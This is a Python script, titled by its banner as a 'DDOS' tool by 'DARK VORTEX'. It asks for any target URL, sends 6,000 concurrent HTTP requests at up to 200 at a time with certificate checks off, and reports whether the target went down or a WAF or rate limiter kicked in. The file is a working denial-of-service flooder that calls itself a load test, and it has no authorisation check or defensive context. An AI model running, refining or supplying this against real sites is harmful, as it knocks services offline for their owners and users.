import asyncio
import aiohttp
import time

# ANSI Escape Codes for Colors
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

def show_banner():
    print(f"{RED}")
    print("=" * 50)
    print("     ██████╗ ██████╗  ██████╗ ███████╗")
    print("     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝")
    print("     ██║  ██║██║  ██║██║   ██║███████╗")
    print("     ██║  ██║██║  ██║██║   ██║╚════██║")
    print("     ██████╔╝██████╔╝╚██████╔╝███████║")
    print("=" * 50)
    print("          BY: DARK VORTEX         ")
    print("=" * 50)
    print(f"{RESET}")

async def fetch(session, url, semaphore, stats):
    async with semaphore:
        try:
            # High-speed asynchronous HTTP GET request
            async with session.get(url, ssl=False, timeout=5) as response:
                if response.status == 200:
                    stats['success'] += 1
                    print(f"{GREEN}[+] Async Request Sent -> Status: 200 OK{RESET}")
                else:
                    stats['error'] += 1
                    print(f"{RED}[-] Async Request Sent -> Status: {response.status}{RESET}")
        except Exception:
            stats['error'] += 1
            print(f"{RED}[X] Connection Failed / Timeout / Blocked{RESET}")

async def main():
    # Display custom banner
    show_banner()
    
    # Interactive input for Target URL
    target_url = input(f"{CYAN}[?] Enter Target URL (e.g., https://example.com): {RESET}").strip()
    
    if not target_url:
        print(f"{RED}[!] Error: Target URL cannot be empty!{RESET}")
        return

    # Configuration for Advanced Async Test
    TOTAL_REQUESTS = 6000   # Kul requests ki miqdar
    CONCURRENCY_LIMIT = 200 # Aik sath chalne wali active connections ki limit
    
    print(f"\n{CYAN}[*] Advanced Async Engine Started (Target: {target_url}) - Total Requests: {TOTAL_REQUESTS}\n{RESET}")
    
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    stats = {'success': 0, 'error': 0}
    
    # TCP Connector setup for high performance
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    start_time = time.time()
    
    asyncio_tasks = []
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(TOTAL_REQUESTS):
            task = asyncio.create_task(fetch(session, target_url, semaphore, stats))
            asyncio_tasks.append(task)
            
        # Tamam requests ko aik sath execute karna
        await asyncio.gather(*asyncio_tasks)
        
    end_time = time.time()
    total_time = end_time - start_time
    
    # Print final results and status
    print(f"\n{CYAN}--- Advanced Test Completed Successfully ---{RESET}")
    print(f"Total Time Taken: {total_time:.2f} seconds")
    print(f"Total Requests Processed: {TOTAL_REQUESTS}")
    print(f"{GREEN}Successful Requests (200 OK): {stats['success']}{RESET}")
    print(f"{RED}Failed Requests / Errors: {stats['error']}{RESET}")
    
    # Final Status Summary
    if stats['success'] > 0 and stats['error'] == 0:
        print(f"\n{GREEN}[STATUS] RESULT: SUCCESSFUL (Target handled high-speed async traffic){RESET}")
    elif stats['error'] > 0 and stats['success'] == 0:
        print(f"\n{RED}[STATUS] RESULT: FAILED (Target server is down or blocked the async connections){RESET}")
    else:
        print(f"\n{CYAN}[STATUS] RESULT: MIXED (WAF / Rate-limiting triggered under high concurrency){RESET}")

if __name__ == "__main__":
    asyncio.run(main())